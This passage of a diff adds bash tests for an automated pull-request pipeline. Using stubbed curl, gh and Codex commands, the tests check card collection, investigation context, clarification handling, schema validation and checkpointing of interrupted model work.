+printf '%s\n' "$url" >> "${AUTOPR_TEST_COLLECT_URLS:-/dev/null}"
+if [[ "$url" == */history ]]; then
+    cp "$AUTOPR_TEST_HISTORY_FILE" "$output_file"
+else
+    cp "$AUTOPR_TEST_BUNDLE_FILE" "$output_file"
+fi
+[ "$write_status" = "0" ] || printf 200
+EOF
+chmod +x "$TMP_DIR/collect-bin/curl"
+collected="$(PATH="$TMP_DIR/collect-bin:$PATH" \
+    RUNNER_TEMP="$TMP_DIR/collect-runner" \
+    MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_TEST_BUNDLE_FILE="$TMP_DIR/collect-bundle.json" \
+    AUTOPR_TEST_HISTORY_FILE="$TMP_DIR/collect-history.json" \
+    AUTOPR_TEST_COLLECT_URLS="$TMP_DIR/collect-urls" \
+    "$AUTOPR_DIR/collect.sh" 2>"$TMP_DIR/collect-error.log")"
+collect_rc=$?
+# The recovery probe costs an API call and a policy run per card, so the shell
+# filter has to mean the same thing as the anchored jq one above it: a refusal
+# whose verdict IS already_fixed, not a note that merely contains the words.
+check "an already_fixed mention in another verdict's note starts no recovery probe" \
+    $(! grep -q '/tasks/88888888-0000-4000-8000-000000000008/history' "$TMP_DIR/collect-urls" \
+      && grep -q '/tasks/55555555-0000-4000-8000-000000000005/history' "$TMP_DIR/collect-urls" \
+      && echo 0 || echo 1)
+
+# A held card stays in the snapshot, marked, so the dashboard can show the
+# hold; refusing to run it is the selector's job (see the held-card cases).
+check "collector keeps unqueued work visibly on hold instead of dropping it" \
+    $(printf '%s' "$collected" | jq -e \
+        'any(.id8 == "bbbbbbbb" and .autopr_paused == true and has("autopr_hold_reason"))' >/dev/null \
+      && echo 0 || echo 1)
+
+check "collector admits a hand-queued card and only in an eligible lane" \
+    $([ "$collect_rc" = "0" ] \
+      && [ "$(printf '%s' "$collected" | jq 'length')" = "6" ] \
+      && printf '%s' "$collected" | jq -e \
+        'map(.id8) == ["11111111", "44444444", "55555555", "77777777", "bbbbbbbb", "cccccccc"]
+         and (.[3].autopr_run_requested_at == "2026-09-02T03:00:00+00:00")
+         and (.[5].autopr_claimed_at == "2026-09-02T03:05:00+00:00")
+         and .[2].autopr_reconsideration_pending
+         and .[2].autopr_reconsideration_event_id == "consumed-collector-event"
+         and (.[3].autopr_reconsideration_pending | not)' >/dev/null \
+      && echo 0 || echo 1)
+
+################################################################################
+# investigate.sh packages checklist, history/discussion, GitHub feedback, and
+# downloaded card files into one context passed to the model.
+################################################################################
+mkdir -p "$TMP_DIR/bin" "$TMP_DIR/runner"
+cat > "$TMP_DIR/bin/curl" <<'EOF'
+#!/usr/bin/env bash
+output_file=""
+write_status=0
+url=""
+method=""
+payload=""
+[ -z "${AUTOPR_TEST_CURL_ARGS:-}" ] || printf '%s\n' "$*" >> "$AUTOPR_TEST_CURL_ARGS"
+while [ "$#" -gt 0 ]; do
+    case "$1" in
+        -o) output_file="$2"; shift 2 ;;
+        -w) write_status=1; shift 2 ;;
+        -X) method="$2"; shift 2 ;;
+        -d) payload="$2"; shift 2 ;;
+        http://*|https://*) url="$1"; shift ;;
+        *) shift ;;
+    esac
+done
+printf '%s\n' "$url" >> "${AUTOPR_TEST_CURL_URLS:-/dev/null}"
+if [[ "$url" == */auth/login ]]; then
+    printf '{"access_token":"stub-token"}'
+    exit 0
+fi
+case "$url" in
+    */autopr/run-defer)
+        printf '{"ok":true}' > "$output_file"
+        ;;
+    */autopr/run-claim)
+        printf '{"ok":%s}' "${AUTOPR_TEST_CLAIM_OK:-true}" > "$output_file"
+        ;;
+    */subtasks)
+        printf '[{"id":"sub-1","title":"Fix current label","is_done":false,"position":0,"round_index":6}]' > "$output_file"
+        ;;
+    */history)
+        if [ -n "${CODEX_STUB_QUESTION:-}" ]; then
+            if [ -n "${CODEX_STUB_COMBINED:-}" ]; then
+                printf '%s' '[{"id":"event-ny","event_type":"activity","metadata":{"kind":"autopr_additional_context","autopr_directives":"draft_pr,trust_still_broken","body":"Go ahead and implement this. -- trust still broken"}}]' > "$output_file"
+            else
+                printf '%s' '[{"id":"event-ny","event_type":"activity","metadata":{"kind":"autopr_additional_context","body":"Use grounding to research NY data and wire it through our codified compliance catalog and scheduling like CA and WA. I am giving you context, not numbered answers."}}]' > "$output_file"
+            fi
+            [ "$write_status" = "0" ] || printf 200
+            exit 0
+        fi
+        printf '[{"id":"event-1","event_type":"activity","metadata":{"body":"The screenshot still says note","attachment_ids":["file-1"]},"created_at":"2026-08-27T00:00:00Z"},{"id":"event-2","event_type":"review_rejected","metadata":{},"created_at":"2026-08-27T00:01:00Z"}]' > "$output_file"
+        ;;
+    */files)
+        if [ "${AUTOPR_TEST_NO_FILES:-0}" = 1 ]; then
+            printf '[]' > "$output_file"
+        else
+            printf '[{"id":"file-1","filename":"screen.png","storage_url":"https://files.invalid/screen.png","content_type":"image/png","file_size":8,"round_index":6,"created_at":"2026-08-27T00:00:00Z"}]' > "$output_file"
+        fi
+        ;;
+    https://files.invalid/screen.png)
+        printf 'png-stub' > "$output_file"
+        ;;
+    */autopr/context-request)
+        [ -z "${AUTOPR_TEST_CONTEXT_REQUEST:-}" ] \
+            || printf '%s' "$payload" > "$AUTOPR_TEST_CONTEXT_REQUEST"
+        printf '{"ok":true}' > "$output_file"
+        ;;
+    */tasks/*)
+        if [ "$method" = PATCH ] && [ -n "${AUTOPR_TEST_CARD_PATCH:-}" ]; then
+            printf '%s' "$payload" > "$AUTOPR_TEST_CARD_PATCH"
+        fi
+        printf '{"ok":true}' > "$output_file"
+        ;;
+    *)
+        printf '{}' > "$output_file"
+        ;;
+esac
+[ "$write_status" = "0" ] || printf 200
+EOF
+chmod +x "$TMP_DIR/bin/curl"
+
+cat > "$TMP_DIR/bin/gh" <<'EOF'
+#!/usr/bin/env bash
+case "$1 $2" in
+    "pr list") printf '44\n' ;;
+    "pr view") printf '{"reviews":[{"id":"review-44","body":"Use Journal everywhere","author":{"login":"haley"}}],"comments":[]}' ;;
+esac
+EOF
+chmod +x "$TMP_DIR/bin/gh"
+
+cat > "$TMP_DIR/bin/codex" <<'EOF'
+#!/usr/bin/env bash
+printf 'Codex: inspecting card context\n'
+printf '%s\n' "$@" > "$CODEX_STUB_ARGS"
+[ -z "${CODEX_STUB_CALL_LOG:-}" ] || printf 'call\n' >> "$CODEX_STUB_CALL_LOG"
+prompt="${!#}"
+printf '%s\n' "$prompt" | sed -n \
+    '/^AUTOPR_INPUTS_BEGIN$/,/^AUTOPR_INPUTS_END$/ { s/^- //p; }' > "$CODEX_STUB_FILES"
+while IFS= read -r input_path; do
+    case "$(basename "$input_path")" in
+        *context.json) cp "$input_path" "$CODEX_STUB_CONTEXT" ;;
+    esac
+done < "$CODEX_STUB_FILES"
+report_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/report\.md' | head -1)"
+decision_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/decision\.json' | head -1)"
+workspace=""
+previous=""
+for argument in "$@"; do
+    if [ "$previous" = -C ]; then
+        workspace="$argument"
+        break
+    fi
+    previous="$argument"
+done
+if [ "${CODEX_STUB_FAIL:-0}" = 1 ]; then
+    printf 'Codex: simulated failure\n'
+    exit 17
+fi
+mkdir -p "$(dirname "$report_path")" "$(dirname "$decision_path")"
+cat > "$report_path" <<'REPORT'
+### Summary
+stub
+### Changes
+stub
+### Blast radius
+stub
+### Confidence
+high
+REPORT
+cat > "$decision_path" <<'DECISION'
+{
+  "schema_version": 1,
+  "outcome": "implementation",
+  "confidence": {
+    "requirements_clarity": {"score": 30, "reason": "clear card"},
+    "evidence_quality": {"score": 20, "reason": "evidence attached"},
+    "code_localization": {"score": 20, "reason": "known files"},
+    "verification_strength": {"score": 15, "reason": "existing checks"},
+    "production_alignment": {"score": 15, "reason": "baseline known"}
+  },
+  "criticality": {"level": "yellow", "reasons": ["scoped terminology"]},
+  "questions": [],
+  "safe_changes_present": true,
+  "no_safe_action_reason": null
+}
+DECISION
+if [ -n "${CODEX_STUB_INVALID_JSON:-}" ]; then
+    printf '{not-json\n' > "$decision_path"
+fi
+if [ -n "${CODEX_STUB_QUESTION:-}" ]; then
+    count=0
+    [ ! -f "$CODEX_STUB_COUNTER" ] || count="$(cat "$CODEX_STUB_COUNTER")"
+    count=$((count + 1)); printf '%s' "$count" > "$CODEX_STUB_COUNTER"
+    if [ "$count" = 1 ] || [ "$CODEX_STUB_QUESTION" = always ]; then
+        jq '.outcome="questions_only" | .safe_changes_present=false |
+            .questions=[{id:"q1",question:"What counsel-approved NY record should be activated?",
+              why_blocking:"Counsel must supply the authority and effective date",
+              default_assumption:"Defer NY activation",
+              options:[{key:"a",label:"Supply counsel record",impact:"Encode NY"},
+                       {key:"b",label:"Defer NY",impact:"Keep unmapped"}]}]' \
+            "$decision_path" > "$decision_path.next"
+        mv "$decision_path.next" "$decision_path"
+        if [ "${CODEX_STUB_PARTIAL_PATCH:-0}" = 1 ] && [ "$count" = 1 ]; then
+            printf 'partial work retained\n' >> "$workspace/README.md"
+            jq '.outcome="partial_implementation" | .safe_changes_present=true' \
+                "$decision_path" > "$decision_path.next"
+            mv "$decision_path.next" "$decision_path"
+        fi
+        if [ -n "${CODEX_STUB_COMBINED:-}" ] && [ "$count" = 1 ]; then
+            jq '.outcome="no_safe_action" | .safe_changes_present=false |
+                .no_safe_action_reason="already_fixed"' \
+                "$decision_path" > "$decision_path.next"
+            mv "$decision_path.next" "$decision_path"
+        fi
+    fi
+fi
+EOF
+chmod +x "$TMP_DIR/bin/codex"
+
+# investigate.sh does real git work in $REPO_ROOT and reset --hards it on some
+# paths. Unset, AUTOPR_WORKSPACE_ROOT means this checkout, so every invocation
+# below points at a throwaway repository instead — the publisher guard refuses
+# that shape outright, and pointing at the checkout is what destroyed a working
+# tree once.
+INVESTIGATE_REPO="$TMP_DIR/investigate-repo"
+mkdir -p "$INVESTIGATE_REPO"
+git -C "$INVESTIGATE_REPO" init -q
+git -C "$INVESTIGATE_REPO" config user.name test
+git -C "$INVESTIGATE_REPO" config user.email test@example.com
+printf 'fixture\n' > "$INVESTIGATE_REPO/README.md"
+git -C "$INVESTIGATE_REPO" add README.md
+git -C "$INVESTIGATE_REPO" commit -qm initial
+git -C "$INVESTIGATE_REPO" branch -M main
+
+cat > "$TMP_DIR/card.json" <<'EOF'
+{"task_id":"f296d090-0000-4000-8000-000000000001","id8":"f296d090","project_id":"8b924347-d6e4-4000-8e7d-ca8f46f76fba","title":"Standardize terminology","category":"fix","mode":"rework","review_note":"No change, including screenshot"}
+EOF
+
+PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" RUNNER_TEMP="$TMP_DIR/runner" \
+GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_FILES="$TMP_DIR/codex-files" \
+CODEX_STUB_CONTEXT="$TMP_DIR/context.json" CODEX_STUB_ARGS="$TMP_DIR/codex-args" \
+AUTOPR_LIVE_LOG="$TMP_DIR/live-work.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/investigate-runtime" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card.json" "$TMP_DIR/report.md" "$TMP_DIR/decision.json" > "$TMP_DIR/investigate-command.log" 2>&1
+investigate_rc=$?
+[ "$investigate_rc" = 0 ] || sed -n '1,120p' "$TMP_DIR/investigate-command.log"
+
+context_ok=1
+if [ "$investigate_rc" = "0" ] \
+    && jq -e '.subtasks[0].round_index == 6 and .history[0].metadata.body == "The screenshot still says note" and .downloaded_attachments[0].id == "file-1" and (.files[0] | has("storage_url") | not)' "$TMP_DIR/context.json" > /dev/null \
+    && grep -q '01-screen.png' "$TMP_DIR/codex-files" \
+    && grep -q 'feedback.json' "$TMP_DIR/codex-files"; then
+    context_ok=0
+fi
+[ "$context_ok" = 0 ] || {
+    printf '%s\n' 'Captured Codex inputs:'
+    sed -n '1,20p' "$TMP_DIR/codex-files"
+    jq . "$TMP_DIR/context.json" 2>/dev/null || true
+}
+check "rework investigation receives discussion, checklist, PR feedback, and screenshot" "$context_ok"
+
+check "investigation context reserves bounded production diagnostics" \
+    $(jq -e '.production == null and .production_recent_errors == [] and .production_log_signals == "" and .changes_since_production == [] and .grounding.web_search_available == false' "$TMP_DIR/context.json" >/dev/null \
+      && ! grep -q 'web_search="live"' "$TMP_DIR/codex-args" \
+      && echo 0 || echo 1)
+
+check "investigation normalizes validated confidence and triage" \
+    $(jq -e '.confidence_score == 100 and .confidence_band == "high" and .awaiting_human == false and .feedback_checkpoint.review_id == "review-44"' "$TMP_DIR/decision.json" >/dev/null && echo 0 || echo 1)
+cp "$TMP_DIR/decision.json" "$TMP_DIR/publication-decision.json"
+
+check "investigation invokes Sol medium and mirrors Codex output to the live-work log" \
+    $(grep -q 'CODEX LIVE STREAM' "$TMP_DIR/live-work.log" \
+      && grep -q 'Codex: inspecting card context' "$TMP_DIR/live-work.log" \
+      && grep -qx 'gpt-5.6-sol' "$TMP_DIR/codex-args" \
+      && grep -qx 'model_reasoning_effort="medium"' "$TMP_DIR/codex-args" \
+      && grep -q '\[COMPLETE\]' "$TMP_DIR/live-work.log" && echo 0 || echo 1)
+
+# The real failure that blocked the first LaunchAgent-dispatched run happened
+# before Codex: Bash 3.2 + `set -u` rejected an empty attachment array.
+jq '.mode = "investigate"' "$TMP_DIR/card.json" > "$TMP_DIR/card-no-files.json"
+AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_FILES="$TMP_DIR/codex-no-files" \
+CODEX_STUB_CONTEXT="$TMP_DIR/context-no-files.json" CODEX_STUB_ARGS="$TMP_DIR/codex-no-files-args" \
+AUTOPR_LIVE_LOG="$TMP_DIR/live-no-files.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/investigate-runtime" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card-no-files.json" "$TMP_DIR/report-no-files.md" \
+    "$TMP_DIR/decision-no-files.json" > /dev/null 2>&1
+no_files_rc=$?
+[ "$no_files_rc" = 0 ] || sed -n '1,120p' "$TMP_DIR/live-no-files.log"
+no_files_count="$(wc -l < "$TMP_DIR/codex-no-files" | tr -d '[:space:]')"
+check "investigation accepts a card with no attachments on macOS Bash" \
+    $([ "$no_files_rc" = 0 ] \
+      && [ "$no_files_count" = 1 ] \
+      && jq -e '.downloaded_attachments == []' "$TMP_DIR/context-no-files.json" >/dev/null \
+      && echo 0 || echo 1)
+[ "$no_files_rc" != 0 ] || [ "$no_files_count" = 1 ] \
+    || printf 'Expected one Codex input without attachments, got %s\n' "$no_files_count"
+
+AUTOPR_TEST_CLAIM_OK=false PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_ARGS="$TMP_DIR/held-codex-args" \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card-no-files.json" "$TMP_DIR/held-report.md" \
+    "$TMP_DIR/held-decision.json" > "$TMP_DIR/held-investigation.log" 2>&1
+held_rc=$?
+check "a card unqueued after collection never reaches the model" \
+    $([ "$held_rc" != 0 ] && [ ! -e "$TMP_DIR/held-codex-args" ] \
+      && grep -q 'was unqueued' "$TMP_DIR/held-investigation.log" && echo 0 || echo 1)
+
+CODEX_STUB_FAIL=1 AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" \
+MATCHA_AUTOPR_ENV="$env_file" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+CODEX_STUB_FILES="$TMP_DIR/codex-failed-files" CODEX_STUB_CONTEXT="$TMP_DIR/context-failed.json" \
+CODEX_STUB_ARGS="$TMP_DIR/codex-failed-args" \
+AUTOPR_LIVE_LOG="$TMP_DIR/live-failed.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/investigate-runtime" \
+AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card-no-files.json" "$TMP_DIR/report-failed.md" \
+    "$TMP_DIR/decision-failed.json" > /dev/null 2>&1
+failed_codex_rc=$?
+check "live tee preserves a failing Codex exit status" \
+    $([ "$failed_codex_rc" != 0 ] \
+      && grep -q '\[FAILED\] Codex exited 17' "$TMP_DIR/live-failed.log" \
+      && echo 0 || echo 1)
+
+CODEX_STUB_INVALID_JSON=1 CODEX_STUB_CALL_LOG="$TMP_DIR/invalid-json-calls" \
+AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_FILES="$TMP_DIR/invalid-json-files" \
+CODEX_STUB_CONTEXT="$TMP_DIR/invalid-json-context.json" CODEX_STUB_ARGS="$TMP_DIR/invalid-json-args" \
+AUTOPR_LIVE_LOG="$TMP_DIR/invalid-json-live.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/investigate-runtime" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_WORKSPACE_ROOT="$INVESTIGATE_REPO" \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/card-no-files.json" "$TMP_DIR/invalid-json-report.md" \
+    "$TMP_DIR/invalid-json-decision.json" > "$TMP_DIR/invalid-json-run.log" 2>&1
+invalid_json_rc=$?
+check "malformed decisions fail schema validation without a grounding retry" \
+    $([ "$invalid_json_rc" != 0 ] \
+      && [ "$(wc -l < "$TMP_DIR/invalid-json-calls" | tr -d '[:space:]')" = 1 ] \
+      && grep -qF 'schema or safety validation' "$TMP_DIR/invalid-json-run.log" \
+      && ! grep -qF 'unresolved_researchable_context' "$TMP_DIR/invalid-json-run.log" \
+      && echo 0 || echo 1)
+
+# End-to-end NY regression: plain context reaches the model; a recycled counsel
+# question gets one correction. A repeated refusal never becomes publishable.
+GROUNDING_REPO="$TMP_DIR/grounding-repo"
+mkdir -p "$GROUNDING_REPO"
+git -C "$GROUNDING_REPO" init -q
+git -C "$GROUNDING_REPO" config user.name test
+git -C "$GROUNDING_REPO" config user.email test@example.com
+printf 'fixture\n' > "$GROUNDING_REPO/README.md"
+git -C "$GROUNDING_REPO" add README.md
+git -C "$GROUNDING_REPO" commit -qm initial
+git -C "$GROUNDING_REPO" branch -M main
+for scenario in once always; do
+    git -C "$GROUNDING_REPO" restore README.md
+    mode=rework; [ "$scenario" != always ] || mode=investigate
+    jq --arg mode "$mode" '.mode=$mode | .title="Support jurisdiction-aware break and scheduling-law rules" |
+        .autopr_capabilities=["research"] |
+        .autopr_reconsideration_pending=true | .autopr_reconsideration_event_id="event-ny"' \
+        "$TMP_DIR/card.json" > "$TMP_DIR/ny-card.json"
+    partial_patch=0; [ "$scenario" != once ] || partial_patch=1
+    CODEX_STUB_QUESTION="$scenario" CODEX_STUB_PARTIAL_PATCH="$partial_patch" \
+    CODEX_STUB_COUNTER="$TMP_DIR/grounding-count-$scenario" \
+    AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_FILES="$TMP_DIR/grounding-files" \
+    CODEX_STUB_CONTEXT="$TMP_DIR/grounding-context.json" CODEX_STUB_ARGS="$TMP_DIR/grounding-args" \
+    AUTOPR_WORKSPACE_ROOT="$GROUNDING_REPO" AUTOPR_SANDBOX_REPO_ROOT="$GROUNDING_REPO" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/grounding-live-$scenario.log" \
+    AUTOPR_TEST_CARD_PATCH="$TMP_DIR/grounding-card-$scenario.json" \
+    AUTOPR_TEST_CONTEXT_REQUEST="$TMP_DIR/grounding-request-$scenario.json" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/grounding-runtime" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+        "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/ny-card.json" "$TMP_DIR/ny-report-$scenario.md" \
+        "$TMP_DIR/ny-decision-$scenario.json" > "$TMP_DIR/ny-run-$scenario.log" 2>&1
+    ny_rc=$?
+    expected=0; [ "$scenario" != always ] || expected=1
+    check "$mode researches NY context with one bounded correction ($scenario)" \
+        $([ "$ny_rc" = "$expected" ] \
+          && [ "$(cat "$TMP_DIR/grounding-count-$scenario" 2>/dev/null)" = 2 ] \
+          && grep -q 'unresolved_researchable_context' "$TMP_DIR/ny-run-$scenario.log" \
+          && grep -qxF 'web_search="live"' "$TMP_DIR/grounding-args" \
+          && grep -qF 'counsel-approval prerequisite' "$TMP_DIR/grounding-args" \
+          && jq -e '.history[0].metadata.body | contains("not numbered answers")' "$TMP_DIR/grounding-context.json" >/dev/null \
+          && echo 0 || echo 1)
+    [ "$ny_rc" = "$expected" ] || tail -35 "$TMP_DIR/ny-run-$scenario.log"
+    if [ "$scenario" = once ]; then
+        check "a corrected NY-context decision retains its safe partial patch" \
+            $(jq -e '.outcome == "implementation" and .confidence_score == 100' "$TMP_DIR/ny-decision-once.json" >/dev/null \
+              && grep -qF 'partial work retained' "$GROUNDING_REPO/README.md" \
+              && echo 0 || echo 1)
+    else
+        check "a second ungrounded NY refusal parks the card before publication" \
+            $([ "$ny_rc" != 0 ] \
+              && grep -qF 'card parked for context' "$TMP_DIR/ny-run-always.log" \
+              && jq -e '.board_column == "changes_requested"
+                   and (.progress_note | contains("[autopr:no-spec "))
+                   and (.progress_note | contains("needs_clarification"))' \
+                   "$TMP_DIR/grounding-card-always.json" >/dev/null \
+              && jq -e '.reason | contains("could not justify its remaining questions")' \
+                   "$TMP_DIR/grounding-request-always.json" >/dev/null \
+              && [ ! -e "$TMP_DIR/ny-decision-always.json.with-feedback" ] \
+              && echo 0 || echo 1)
+    fi
+done
+
+# A single pass can violate several independent contracts. The one corrective
+# run must receive all of them instead of whichever elif arm happened first.
+jq '.mode="rework" | .autopr_capabilities=["research"] |
+    .autopr_reconsideration_pending=true | .autopr_reconsideration_event_id="event-ny"' \
+    "$TMP_DIR/card.json" > "$TMP_DIR/combined-card.json"
+CODEX_STUB_QUESTION=once CODEX_STUB_COMBINED=1 \
+CODEX_STUB_COUNTER="$TMP_DIR/combined-count" CODEX_STUB_CALL_LOG="$TMP_DIR/combined-calls" \
+AUTOPR_TEST_NO_FILES=1 PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+GITHUB_REPOSITORY="tajaa/matcha-recruit" CODEX_STUB_FILES="$TMP_DIR/combined-files" \
+CODEX_STUB_CONTEXT="$TMP_DIR/combined-context.json" CODEX_STUB_ARGS="$TMP_DIR/combined-args" \
+AUTOPR_WORKSPACE_ROOT="$GROUNDING_REPO" AUTOPR_SANDBOX_REPO_ROOT="$GROUNDING_REPO" \
+AUTOPR_LIVE_LOG="$TMP_DIR/combined-live.log" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/combined-runtime" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+    "$AUTOPR_DIR/investigate.sh" "$TMP_DIR/combined-card.json" "$TMP_DIR/combined-report.md" \
+    "$TMP_DIR/combined-decision.json" > "$TMP_DIR/combined-run.log" 2>&1
+combined_rc=$?
+combined_correction="$(grep 'directive-correction.json$' "$TMP_DIR/combined-files" | tail -1)"
+check "one correction includes every independently detected decision defect" \
+    $([ "$combined_rc" = 0 ] \
+      && [ "$(wc -l < "$TMP_DIR/combined-calls" | tr -d '[:space:]')" = 2 ] \
+      && jq -e '.kind | contains("already_fixed_requires_evidence")
+          and contains("directive_violation")
+          and contains("unresolved_researchable_context")' \
+          "$combined_correction" >/dev/null \
+      && echo 0 || echo 1)
+
+################################################################################
+# The msandbox bridge operates on a tracked-only clone and returns one patch.
+# The direct seam below substitutes only for Docker/Codex; clone/input/
+# output/patch behavior is the same path production uses.
+################################################################################
+SANDBOX_TEST_REPO="$TMP_DIR/sandbox-source"
+mkdir -p "$SANDBOX_TEST_REPO/client/src" "$SANDBOX_TEST_REPO/secrets" \
+  "$SANDBOX_TEST_REPO/server/app/matcha/services/huume"
+git -C "$SANDBOX_TEST_REPO" init --initial-branch=main --quiet
+git -C "$SANDBOX_TEST_REPO" config user.name test
+git -C "$SANDBOX_TEST_REPO" config user.email test@example.com
+printf 'export const existing = true;\n' > "$SANDBOX_TEST_REPO/client/src/existing.ts"
+printf 'operator instructions\n' > "$SANDBOX_TEST_REPO/server/app/matcha/services/huume/CLAUDE.md"
+# A TRACKED file under a denied path, so a rename out of it has a real source.
+mkdir -p "$SANDBOX_TEST_REPO/deploy"
+printf 'deploy notes\n' > "$SANDBOX_TEST_REPO/deploy/notes.txt"
+git -C "$SANDBOX_TEST_REPO" add client/src/existing.ts \
+  server/app/matcha/services/huume/CLAUDE.md deploy/notes.txt
+git -C "$SANDBOX_TEST_REPO" commit --quiet -m base
+printf 'host-only-secret\n' > "$SANDBOX_TEST_REPO/secrets/private.pem"
+
+# Simulate a model killed before the bridge copied its output into RUNNER_TEMP.
+# The checkpoint must capture tracked + untracked edits directly from the
+# disposable workspace and make them available to the next sandbox attempt.
+CHECKPOINT_RUNTIME="$TMP_DIR/checkpoint-runtime"
+mkdir -p "$CHECKPOINT_RUNTIME"
+git clone --quiet "$SANDBOX_TEST_REPO" "$CHECKPOINT_RUNTIME/workspace"
+checkpoint_base="$(git -C "$CHECKPOINT_RUNTIME/workspace" rev-parse HEAD)"
+mkdir -p "$CHECKPOINT_RUNTIME/workspace/.git/autopr-io/output"
+printf '%s\n' "$checkpoint_base" \
+    > "$CHECKPOINT_RUNTIME/workspace/.git/autopr-io/model-base-sha"
+printf 'cccccccc-0000-4000-8000-000000000003\n' \
+    > "$CHECKPOINT_RUNTIME/workspace/.git/autopr-io/task-id"
+printf 'export const existing = false;\n' \
+    > "$CHECKPOINT_RUNTIME/workspace/client/src/existing.ts"
+printf 'export const recovered = true;\n' \
+    > "$CHECKPOINT_RUNTIME/workspace/client/src/recovered.ts"
+printf '%s\n' '### Summary' partial \
+    > "$CHECKPOINT_RUNTIME/workspace/.git/autopr-io/output/report.md"
+printf '%s\n' '{"schema_version":1}' \
+    > "$CHECKPOINT_RUNTIME/workspace/.git/autopr-io/output/decision.json"
+printf 'partial transcript\n' > "$TMP_DIR/checkpoint-live.log"
+cat > "$TMP_DIR/checkpoint-card.json" <<'EOF'
+{"task_id":"cccccccc-0000-4000-8000-000000000003","id8":"cccccccc","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+checkpoint_path="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/checkpoint-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$(date +%s)" 20)"
+latest_checkpoint="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" latest "$TMP_DIR/checkpoint-card.json")"
+check "interrupted model work is checkpointed outside the disposable workspace" \
+    $([ "$latest_checkpoint" = "$checkpoint_path" ] \
+      && grep -q 'recovered.ts' "$checkpoint_path/model.patch" \
+      && grep -q 'partial transcript' "$checkpoint_path/transcript.log" \
+      && jq -e '.patch_saved == true and .runtime_limited == false and .changed_file_count == 2' \
+        "$checkpoint_path/metadata.json" >/dev/null \
+      && echo 0 || echo 1)
+
+timeout_started_at="$(( $(date +%s) - 1200 ))"
+runtime_checkpoint_path="$(PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_TEST_CURL_ARGS="$TMP_DIR/checkpoint-curl-args" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=timeout-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/checkpoint-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$timeout_started_at" 20)"
+check "timed-out work moves to Changes Requested with a readable approval card" \
+    $(jq -e '.runtime_limited == true and .changed_file_count == 2
+        and .progress_excerpt == "partial"' \
+        "$runtime_checkpoint_path/metadata.json" >/dev/null \
+      && grep -q 'changes_requested' "$TMP_DIR/checkpoint-curl-args" \
+      && grep -q 'Why more time' "$TMP_DIR/checkpoint-curl-args" \
+      && grep -q 'Done so far' "$TMP_DIR/checkpoint-curl-args" \
